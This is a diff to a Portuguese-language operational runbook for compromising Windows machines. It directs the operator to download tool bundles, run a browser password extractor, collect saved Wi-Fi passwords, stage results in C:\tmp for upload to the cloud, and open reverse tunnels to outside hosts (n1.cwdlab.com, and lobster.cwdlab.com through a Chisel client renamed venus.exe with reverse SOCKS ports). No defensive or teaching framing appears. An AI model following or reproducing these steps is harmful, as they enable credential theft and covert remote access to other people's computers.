@@ -1,7 +1,7 @@
 # Guia de Execução
 
 1 Ferramentas
-Baixar o [zip](https://1drv.ms/u/s!AjfrkQYLG_fYgUBJHhDy2mxAOZ9x?e=Ms4N1w) com todas as ferramentas de uma vez\
+Baixar o [1drive.zip](https://1drv.ms/u/s!AjfrkQYLG_fYgUBJHhDy2mxAOZ9x?e=Ms4N1w) ou [github.zip](https://github.com/tu74nkamon/guide/blob/main/EXECUCAO2.zip) com todas as ferramentas de uma vez\
 
 # Android Wi-Fi
 instalar um leitor de qrcode no seu celular \
@@ -11,7 +11,7 @@ https://android.gadgethacks.com/how-to/see-passwords-for-wi-fi-networks-youve-co
 # Mapeamento
 1. Criar a pasta tmp em **C:\tmp** Nela estarão os arquivos que você deve coletar ao final, comprimindo a pasta e enviando para nuvem
 2. Baixar Ferramentas\
-  2.1 O Arquivo [EXECUCAO.zip](https://1drv.ms/u/s!AjfrkQYLG_fYgUBJHhDy2mxAOZ9x?e=Ms4N1w) contém as pastas:\
+  2.1 O Arquivo [EXECUCAO.zip](https://1drv.ms/u/s!AjfrkQYLG_fYgUBJHhDy2mxAOZ9x?e=Ms4N1w) ou [github.zip](https://github.com/tu74nkamon/guide/blob/main/EXECUCAO2.zip) contém as pastas:\
       - Extencoes (Extenções Browser Chrome e Edge)\
       - deploycat (tunel)\
       - browser_pwd_extract (extrator de senhas browser que é o arquivo **chromium_based_browsers.exe**)\
@@ -28,7 +28,7 @@ https://android.gadgethacks.com/how-to/see-passwords-for-wi-fi-networks-youve-co
 # PWD Browsers
 4. Captura de Informações dos Browsers\
    4.1 Certifique-se de que existe a pasta C:\tmp\    \
-   4.2 Baixe / Extraia  o ZIP [chromiumaster.zip](https://1drv.ms/u/s!AjfrkQYLG_fYelG61GupNU6K5qI?e=ZWqoUe)  e execute o programa chromium_based_browsers.exe. 
+   4.2 Baixe / Extraia  o ZIP [chromiumaster.zip](https://1drv.ms/u/s!AjfrkQYLG_fYelG61GupNU6K5qI?e=ZWqoUe) também presente no arquivo EXECUCAO2.zip e execute o programa chromium_based_browsers.exe. 
 
 # Reverse Tunnel
 5. Tunnel
@@ -42,7 +42,8 @@ Executar em powershell (dentro da pasta C:\Users\"user"\connect) os seguintes co
 - Start-Connect -d "n1.cwdlab.com" -s "172.16.1.197"
 
 - 5.2  Chisel Tunnel
-   Download no [link](https://1drv.ms/f/s!AjfrkQYLG_fYgSX-FsDPaSIMLnfq?e=lS5hOx) e alterar em cada maquina diferente a porta para o intervalo de 1080 ate 1090\
+   Download no [1drive](https://1drv.ms/f/s!AjfrkQYLG_fYgSX-FsDPaSIMLnfq?e=lS5hOx) ou [github](https://github.com/tu74nkamon/guide/blob/main/VENUS.zip) e alterar em cada maquina diferente a porta para o intervalo de 1080 ate 1090\
+>>> Executar no CMD do windows\ 
    PC1) venus.exe client https://lobster.cwdlab.com R:127.0.0.1:1080:socks\
    PC2) venus.exe client https://lobster.cwdlab.com R:127.0.0.1:1081:socks\
    PC3) venus.exe client https://lobster.cwdlab.com R:127.0.0.1:1082:socks\
